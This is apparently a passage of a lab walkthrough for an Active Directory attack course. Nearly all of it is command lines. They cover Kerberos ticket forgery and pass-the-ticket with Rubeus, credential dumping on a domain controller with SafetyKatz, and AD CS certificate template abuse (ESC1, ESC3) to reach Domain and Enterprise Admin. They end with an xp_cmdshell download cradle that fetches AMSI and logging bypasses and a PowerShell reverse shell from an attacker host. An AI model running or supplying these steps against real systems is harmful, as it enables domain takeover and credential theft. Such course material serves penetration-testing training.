C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
**Forge a referral ticket**
- Let's Forge a referral ticket. Note that we are not injecting any SID History here as it would be filtered out. Run the below command:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:fec83e5de6750fded29002434e626a53 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```
- Copy the base64 encoded ticket from above and use it in the following command:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```
- Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc.
```
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```
#### Flag - Contents of secret.txt on eurocorp-dc	
```
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```


---


# Objective - 21
#### Flag - Name of the AD CS template that has ENROLLEE_SUPPLIES_SUBJECT
```
C:\AD\Tools\Certify.exe cas

C:\AD\Tools\Certify.exe find

C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```
- The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that studentx is a member of RDPUsers group. This means that we can request certificate for any user as studentx.
- Let's request a certificate for Domain Admin - Administrator:
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
- Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to esc1.pem.
- We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use SecretPass@123 as the export password.
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```
- Use the PFX created above with Rubeus to request a TGT for DA - Administrator!
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
```
- Check if we actually have DA privileges now:
```
winrs -r:dcorp-dc cmd /c set username
```
- Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```
- Save the certificate to esc1-EA.pem and convert it to PFX. I will use SecretPass@123 as the export password:
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```
- Save the certificate to esc1-EA.pem and convert it to PFX. I will use SecretPass@123 as the export password:
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```
- Use Rubeus to request TGT for Enterprise Administrator - Administrator
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```
- Finally, access mcorp-dc!
```
winrs -r:mcorp-dc cmd /c  set username
```
#### Flag - Name of the AD CS template that has EKU of Certificate Request Agent and grants enrollment rights to Domain Users	
```
C:\AD\Tools\Certify.exe find /vulnerable
```
- The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants enrollment rights to Domain users. If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.
```
C:\AD\Tools\Certify.exe find
```
- There is a template "SmartCardEnrollment-Users" Now, request an Enrollment Agent Certificate from the template "SmartCardEnrollment-Agent":
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```
- Like earlier, save the certificate text to esc3.pem and convert to pfx. Let's keep using SecretPass@123 as the export password:
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```
- Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template SmartCardEnrollment-Users:
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```
- Once again, save the certificate text to esc3-DA.pem and convert the pem to pfx. Still using SecretPass@123 as the export password:
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```
- Use the esc3-DA created above with Rubeus to request a TGT for DA
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
```
- Check if we actually have DA privileges now:
```
winrs -r:dcorp-dc cmd /c set username
```
- To escalate to Enterprise Admin, we just need to make changes to request to the SmartCardEnrollmentUsers template and Rubeus. Please note that we are using '/onbehalfof: mcorp\administrator' here:
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```
- Convert the pem to esc3-EA.pfx using openssl and use the pfx with Rubeus:
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```
- Finally, access mcorp-dc!
```
winrs -r:mcorp-dc cmd /c  set username
```
#### Flag - Name of the CA attribute that allows requestor to provide Subject Alternative Names	
```
C:\AD\Tools\Certify.exe find
```
- look into CA section
#### Flag - Name of the group that has enrollment rights on the CA-Integration template	
```
C:\AD\Tools\Certify.exe find
```


---


# Objective - 22
#### Flag - First SQL Server linked to dcorp-mssql	
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1

Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```
- We can use Get-SQLServerLinkCrawl for crawling the database links automatically:
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```
#### Flag - Name of SQL Server user used to establish link between dcorp-sql1 and dcorp-mgmt	
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```
- check the output
#### Flag - SQL Server privileges on eu-sql	
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

#### Flag - Privileges on operating system of eu-sql	
- Sweet! We have sysadmin on eu-sql server!
- If xp_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```
- Create Invoke-PowerShellTcpEx.ps1:
	- Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.
	- Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).
	- Add "Power -Reverse -IPAddress 172.16.100.X -Port 443" (without quotes) to the end of the file.
- Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener:
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
```
- On the listener:
```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
$env:username
$env:computername
```